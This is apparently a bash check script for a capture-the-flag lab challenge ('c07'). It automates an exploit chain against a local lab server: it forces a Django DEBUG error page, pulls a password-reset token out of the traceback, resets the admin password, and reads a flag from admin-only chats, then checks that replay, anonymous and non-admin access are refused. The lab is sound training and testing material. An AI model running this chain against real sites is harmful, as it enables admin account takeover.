#!/usr/bin/env bash
# c07 — Django DEBUG technical 500 leaks the drafted reset mail (token), token -> admin.
set -uo pipefail
LAB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
ROOT="$(cd "$LAB_DIR/../.." && pwd)"
# shellcheck source=/dev/null
source "$ROOT/_shared/lib/check.sh"

PORT_HTTPS="${PORT_HTTPS:-18503}"
H="https://${LAB_HOST:-127.0.0.1}:${PORT_HTTPS}"
API='Host: chat-api.corp.lab'
JSON='Content-Type: application/json'
ADMIN_EMAIL="${ADMIN_EMAIL:-admin@corp.lab}"
NEWPASS="Lab-Reset-$(date +%s)-Aa1!"

for _ in $(seq 1 60); do
  [[ "$(curl -sk -o /dev/null -w '%{http_code}' -H "$API" "$H/api/")" == "200" ]] && break
  sleep 1
done

echo "== c07 Django DEBUG -> reset token =="

# 1. the API is up and is DRF
assert_code "API root 200" 200 -k -H "$API" "$H/api/"
assert_body_has "API root lists the reset route" "auth/password_reset" -k -H "$API" "$H/api/"

# 2. the 500: broken SMTP + DEBUG=True
code="$(curl -sk -o /tmp/c07-500.html -w '%{http_code}' -H "$API" -H "$JSON" \
  -d "{\"email\":\"$ADMIN_EMAIL\"}" "$H/api/auth/password_reset")"
assert_eq "password_reset -> 500" "500" "$code"
assert_file_size_gt "technical page is large (>50 KB)" 50000 /tmp/c07-500.html
assert_file_has "page is a Django traceback" "Traceback" /tmp/c07-500.html
assert_file_has "the SMTP failure is the exception" "ConnectionRefusedError" /tmp/c07-500.html
TOKEN="$(grep -oE 'token=[0-9a-f]{32}' /tmp/c07-500.html | head -1 | cut -d= -f2)"
assert_ne "reset token harvested from the debug page" "" "$TOKEN"
assert_file_has "the drafted mail body is in the traceback" "Reset link:" /tmp/c07-500.html
assert_file_has "the reset page reflects DEBUG=True (settings section)" "DEBUG" /tmp/c07-500.html

# 3. redeem it: single use, then login
assert_code "confirm with harvested token -> 200" 200 -k -H "$API" -H "$JSON" \
  -d "{\"token\":\"$TOKEN\",\"password\":\"$NEWPASS\"}" "$H/api/auth/password_reset/confirm"
assert_code "replay the same token -> 400" 400 -k -H "$API" -H "$JSON" \
  -d "{\"token\":\"$TOKEN\",\"password\":\"$NEWPASS\"}" "$H/api/auth/password_reset/confirm"

LOGIN="$(curl -sk -H "$API" -H "$JSON" -d "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$NEWPASS\"}" \
  "$H/api/auth/login")"
JWT="$(printf '%s' "$LOGIN" | jq -r '.token // empty')"
ROLE="$(printf '%s' "$LOGIN" | jq -r '.role // empty')"
assert_ne "login with the new password returns a token" "" "$JWT"
assert_eq "the account is the admin" "admin" "$ROLE"

# 4. admin data (the flag lives in an admin-only chat)
curl -sk -H "$API" -H "Authorization: Bearer $JWT" "$H/api/chats" -o /tmp/c07-admin.json
assert_file_has "admin chats readable" "results" /tmp/c07-admin.json
assert_file_has "flag present in admin chats" "FLAG{" /tmp/c07-admin.json

# 5. a normal agent sees neither the flag nor the user list
AGENT="$(curl -sk -H "$API" -H "$JSON" -d '{"email":"alex@corp.lab","password":"agent-pass-2026"}' \
  "$H/api/auth/login" | jq -r '.token // empty')"
assert_ne "agent login works" "" "$AGENT"
curl -sk -H "$API" -H "Authorization: Bearer $AGENT" "$H/api/chats" -o /tmp/c07-agent.json
assert_file_has "agent chats are readable" "alex" /tmp/c07-agent.json
assert_file_lacks "agent chats do not contain the flag" "FLAG{" /tmp/c07-agent.json

# 6. auth enforcement on the admin-only surface
ANON="$(curl -sk -o /dev/null -w '%{http_code}' -H "$API" "$H/api/users/")"
assert_true "anonymous /api/users/ refused (401/403)" test "$ANON" = "401" -o "$ANON" = "403"
assert_code "admin /api/users/ 200" 200 -k -H "$API" -H "Authorization: Bearer $JWT" "$H/api/users/"

# 7. DEBUG does not turn every 404 into a leak
assert_code "/api/nope -> 404" 404 -k -H "$API" "$H/api/nope"
assert_body_lacks "404 has no traceback" "Traceback" -k -H "$API" "$H/api/nope"

summary
